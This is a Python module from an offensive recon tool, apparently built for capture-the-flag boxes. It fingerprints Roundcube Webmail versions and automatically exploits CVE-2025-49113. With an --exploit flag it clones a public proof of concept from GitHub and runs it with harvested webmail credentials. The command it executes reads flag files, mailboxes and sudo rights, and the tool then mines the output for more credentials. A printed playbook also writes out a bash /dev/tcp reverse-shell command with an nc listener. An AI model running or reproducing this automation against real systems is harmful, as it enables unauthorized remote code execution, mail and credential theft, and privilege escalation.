"""Roundcube Webmail version fingerprint + CVE mapping.

A CTF box that hands you webmail credentials (an onboarding PDF -> kevin) is
almost always staging an *authenticated* Roundcube exploit, not "read an email."
searchsploit dumps eleven ancient 0.x entries; this module instead pins the
installed version and names the one CVE that matters for it — most importantly
CVE-2025-49113, the June-2025 authenticated RCE (PHP object injection via the
`_from` parameter) affecting Roundcube <= 1.5.10 and 1.6.0-1.6.10.

Detection is unauthenticated (CHANGELOG / composer.json / page markers). When a
credential is in hand the emitted finding is a ready, filled-in exploit
command — scryer already recovered the login, so this is the path to the shell
and the user flag.
"""

from __future__ import annotations

import re
import ssl
import subprocess
import urllib.error
import urllib.request
from typing import List, Optional

from ...core import utils, tooling
from ...core.report import HostReport, Finding

# CVE-2025-49113: authenticated RCE. Fixed in 1.6.11 and 1.5.10.
_RCE_FIXED = {(1, 6): (1, 6, 11), (1, 5): (1, 5, 10)}


def run(host: HostReport, opts) -> None:
    seen = host.__dict__.setdefault("_roundcube_done", set())
    for scheme, hoststr, port in _web_targets(host):
        key = (hoststr, port)
        if key in seen:
            continue
        base = f"{scheme}://{hoststr}:{port}"
        version = _detect(base, hoststr)
        if version is None:
            continue
        seen.add(key)
        _report(host, base, hoststr, version)
        if getattr(opts, "exploit", False) and _rce_vulnerable(version):
            _exploit(host, base, hoststr, version)


# --------------------------------------------------------------------------
def _detect(base: str, vhost: str) -> Optional[str]:
    """Return the Roundcube version string ('1.6.7' / 'unknown'), or None if
    this isn't Roundcube."""
    root = _get(base + "/", vhost)
    if not root or "roundcube" not in root.lower():
        # also try the login task directly
        root = _get(base + "/?_task=login", vhost)
        if not root or "roundcube" not in root.lower():
            return None
    # 1) CHANGELOG lists the newest release first.
    for path in ("/CHANGELOG.md", "/CHANGELOG"):
        body = _get(base + path, vhost)
        if body:
            m = re.search(r"(?im)^\s*#*\s*(?:release\s+)?(\d+\.\d+\.\d+)", body)
            if m:
                return m.group(1)
    # 2) composer.json / composer.lock
    for path in ("/composer.json", "/composer.lock"):
        body = _get(base + path, vhost)
        if body:
            m = (re.search(r'"roundcube/webmail"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body)
                 or re.search(r'"version"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body))
            if m:
                return m.group(1)
    # 3) markers in the page itself
    for pat in (r"Roundcube\s*Webmail[/ ]v?(\d+\.\d+\.\d+)",
                r'rcversion\s*[:=]\s*["\']?(\d+)',
                r'name=["\']generator["\'][^>]*content=["\']Roundcube[^0-9]*'
                r'(\d+\.\d+\.\d+)'):
        m = re.search(pat, root, re.I)
        if m and "." in m.group(1):
            return m.group(1)
    return "unknown"


def _report(host: HostReport, base: str, vhost: str, version: str) -> None:
    utils.section(f"ROUNDCUBE {vhost}")
    vuln = _rce_vulnerable(version)
    creds = _webmail_creds(host)
    cred_line = (f"You already have webmail creds ({creds[0]}) — this is "
                 "authenticated RCE." if creds
                 else "Log in first (onboarding creds / spray), then exploit.")

    if vuln:
        utils.log("hot", f"Roundcube {version} — CVE-2025-49113 authenticated RCE "
                         "(PHP object injection)", indent=1)
        host.add(Finding(
            title="Roundcube CVE-2025-49113 (authenticated RCE)",
            detail=_playbook(base, version, creds, _mail_domain(host, vhost))
                   + "\n\n" + cred_line,
            severity="critical", category="vuln", port=_port(base),
            service="http", evidence=f"Roundcube {version}"))
    else:
        utils.log("info", f"Roundcube {version} detected "
                          f"({'patched vs CVE-2025-49113' if version != 'unknown' else 'version hidden'})",
                  indent=1)
        host.add(Finding(
            title=f"Roundcube Webmail {version}",
            detail=f"Roundcube at {base}. {cred_line} If <= 1.6.10/1.5.10 it is "
                   "vulnerable to CVE-2025-49113 (auth RCE); confirm the exact "
                   "version (/CHANGELOG.md, /composer.json).",
            severity="high" if creds else "medium", category="web",
            port=_port(base), service="http",
            confidence="potential", evidence=f"Roundcube {version}"))


def _playbook(base: str, version: str, creds: List[str], domain: str = "") -> str:
    login = creds[0] if creds else "<user>:<pass>"
    user, _, pw = login.partition(":")
    pw = pw or "<pass>"
    domain = domain or "<domain>"
    return (
        f"Roundcube {version} at {base} is vulnerable to CVE-2025-49113 — an "
        "authenticated RCE via PHP object injection in the `_from` parameter "
        "(patched in 1.6.11 / 1.5.10). You already have a valid login.\n\n"
        "# grab a public PoC, then let scryer run it automatically next time:\n"
        "git clone https://github.com/fearsoff-org/CVE-2025-49113   # or "
        "hakaioffsec/CVE-2025-49113-exploit, Zwique/CVE-2025-49113\n"
        "export SCRYER_RC_EXPLOIT=$PWD/CVE-2025-49113/CVE-2025-49113.php\n"
        "# or run it by hand (start `nc -lvnp 4444` first):\n"
        f"php CVE-2025-49113.php {base}/ {user} {domain} "
        "'bash -c \"bash -i >& /dev/tcp/YOUR_TUN0/4444 0>&1\"'\n"
        "# -> shell as the web user; then: cat /home/*/user.txt ; sudo -l")


# --------------------------------------------------------------------------
# active exploitation (--exploit). Auto-runs the access/RCE exploit; a DoS or
# otherwise destructive CVE would never be auto-fired (nothing here is one —
# CVE-2025-49113 is an authenticated RCE).
# --------------------------------------------------------------------------
def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
    creds = _webmail_creds(host)
    if not creds:
        utils.log("dim", "no webmail credential in hand yet — exploit needs a "
                         "login (recover one first)", indent=1)
        return False
    user, _, pw = creds[0].partition(":")
    user = user.split("@", 1)[0]
    if not pw:
        return False

    domain = _mail_domain(host, vhost)
    poc = _ensure_poc()
    if not poc:
        utils.log("warn", "no PoC available and git can't fetch one — set "
                          "SCRYER_RC_EXPLOIT=/path/to/CVE-2025-49113.php; the "
                          "finding has the ready command", indent=1)
        return False

    utils.log("hot", f"CVE-2025-49113: exploiting Roundcube as {user} via "
                     f"{__import__('os').path.basename(poc)}", indent=1)
    # The PoC runs a command and returns its output — so just read the flags
    # directly (no listener needed). Also do quick privesc recon.
    loot = ("id; hostname; echo ===FLAGS===; "
            "cat /home/*/user.txt /root/root.txt /var/mail/* 2>/dev/null; "
            "echo ===SUDO===; sudo -n -l 2>/dev/null; "
            "echo ===HOME===; ls -la /home 2>/dev/null")
    out = _run_poc(poc, base, user, pw, domain, loot)
    if not out or ("uid=" not in out and "===FLAGS===" not in out):
        utils.log("warn", "exploit ran but returned no command output — the PoC "
                          "may need different args or the target is patched; the "
                          "finding has the manual command", indent=1)
        if out:
            for line in out.strip().splitlines()[:8]:
                utils.log("dim", "  " + line[:200], indent=1)
        return False

    utils.log("hot", "RCE via CVE-2025-49113 — command output:", indent=1)
    for line in out.strip().splitlines()[:40]:
        utils.log("dim", "  " + line[:200], indent=1)
    got = _grab_flags(host, out, base)
    _harvest_from_shell(host, out)
    host.add(Finding(
        title="RCE via Roundcube CVE-2025-49113",
        detail=f"Authenticated RCE on {base} as the web user with {user}:{pw} "
               f"(CVE-2025-49113). Command output captured. Privesc: check the "
               "sudo -l / SUID output.", severity="critical", category="vuln",
        port=_port(base), service="http", evidence=out[:300]))
    return got


def _run_poc(poc, base, user, pw, domain, cmd) -> str:
    """Run the PoC with the arg order it expects and return the command output.
    hakaioffsec (php): URL user pass command; fearsoff (php): URL user domain
    command; plus common python flag styles."""
    runner = ("php" if poc.lower().endswith(".php")
              else (tooling.resolve("python3") or "python3"))
    runner = tooling.resolve(runner) or runner
    url = base + "/"
    last = ""
    for argv in ([runner, poc, url, user, pw, cmd],
                 [runner, poc, url, user, domain, cmd],
                 [runner, poc, "-u", url, "-l", user, "-p", pw, "-c", cmd],
                 [runner, poc, "--url", url, "--user", user, "--password", pw,
                  "--command", cmd]):
        try:
            r = subprocess.run(argv, timeout=90, capture_output=True, text=True,
                               errors="replace")
        except (OSError, subprocess.SubprocessError):
            continue
        out = (r.stdout or "") + (r.stderr or "")
        if "uid=" in out or "===FLAGS===" in out:   # command actually executed
            return out
        last = out or last
    return last          # unconfirmed output, for diagnostics


def _ensure_poc() -> Optional[str]:
    """Locate the CVE-2025-49113 PoC, auto-fetching the verified public exploit
    into the scryer cache once (same pattern as rogue-jndi for Log4Shell)."""
    import os
    env = os.environ.get("SCRYER_RC_EXPLOIT")
    if env and os.path.isfile(env):
        return env
    cache = os.path.expanduser("~/.cache/scryer/CVE-2025-49113")
    existing = _find_poc(cache)
    if existing:
        return existing
    git = tooling.resolve("git")
    if not git:
        return None
    utils.log("info", "fetching the CVE-2025-49113 PoC (one-time)", indent=2)
    try:
        os.makedirs(os.path.dirname(cache), exist_ok=True)
        subprocess.run([git, "clone", "--depth", "1",
                        "https://github.com/hakaioffsec/CVE-2025-49113-exploit",
                        cache], capture_output=True, timeout=90)
    except (OSError, subprocess.SubprocessError):
        return None
    return _find_poc(cache)


def _find_poc(directory: str) -> Optional[str]:
    import os
    if not os.path.isdir(directory):
        return None
    for base, _dirs, files in os.walk(directory):
        for f in files:
            if re.search(r"(?i)cve.?2025.?49113.*\.(php|py)$", f) or \
                    f.lower() in ("exp.py", "exploit.py", "poc.py"):
                return os.path.join(base, f)
    return None


def _harvest_from_shell(host: HostReport, out: str) -> None:
    from ...data import knowledge
    for _u, pw in list(knowledge.find_conn_creds(out)):
        host.add_cred(pw)
    for _lbl, val, _sev in knowledge.extract_secrets(out):
        host.add_cred(val)


def _mail_domain(host: HostReport, vhost: str) -> str:
    """The email domain for the login (kevin@<domain>) — from a harvested email,
    else the registrable parent of the webmail vhost (mail001.enigma.htb ->
    enigma.htb)."""
    for e in host.__dict__.get("emails", set()):
        if "@" in e:
            return e.split("@", 1)[1]
    labels = vhost.split(".")
    return ".".join(labels[-2:]) if len(labels) >= 2 else vhost


def _grab_flags(host: HostReport, blob: str, base: str) -> bool:
    from ...data import knowledge
    got = False
    for tok in knowledge.find_flags(blob or "", allow_hex=True):
        got = True
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c("║ FLAG (Roundcube RCE)", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(title="FLAG via Roundcube CVE-2025-49113", detail=tok,
                         severity="critical", category="flag",
                         port=_port(base), service="http", evidence=tok))
    return got


# --------------------------------------------------------------------------
def _rce_vulnerable(version: str) -> bool:
    if version == "unknown":
        # Do NOT assume vulnerable — a patched build (e.g. Roundcube 1.6.16 on
        # HTB Enigma) that hides its version would send us chasing a dead-end RCE
        # for no reason. Only auto-exploit a CONFIRMED-vulnerable version.
        return False
    parts = [int(x) for x in re.findall(r"\d+", version)[:3]]
    while len(parts) < 3:
        parts.append(0)
    v = tuple(parts)
    branch = (v[0], v[1])
    fixed = _RCE_FIXED.get(branch)
    if fixed:
        return v < fixed
    return v < (1, 6, 11)    # older branches (<=1.4) are all affected


def _webmail_creds(host: HostReport) -> List[str]:
    out = []
    for f in host.findings:
        if f.title.startswith("Mailbox access") and f.evidence:
            out.append(f.evidence.strip())
    # fall back to any recovered plaintext paired with a known mailbox user
    return out


def _web_targets(host: HostReport):
    from ...data import knowledge
    ports = [(e["port"], bool(e.get("secure")) or e["port"] in knowledge.HTTPS_PORTS)
             for e in host.open_ports
             if (e.get("service") or "").lower() in ("http", "https")
             or e["port"] in knowledge.HTTP_PORTS or e["port"] in knowledge.HTTPS_PORTS]
    names = [host.resolved_ip] + [h for h in host.hostnames
                                  if "." in h and not _is_ip(h)]
    for port, secure in ports:
        scheme = "https" if secure else "http"
        for name in dict.fromkeys(names):
            yield scheme, name, port


def _is_ip(name: str) -> bool:
    p = name.split(".")
    return len(p) == 4 and all(x.isdigit() for x in p)


def _port(base: str) -> int:
    m = re.search(r":(\d+)", base.split("//", 1)[-1])
    return int(m.group(1)) if m else 80


def _get(url: str, vhost: str, timeout: float = 8) -> str:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "scryer",
                                               "Host": vhost})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""
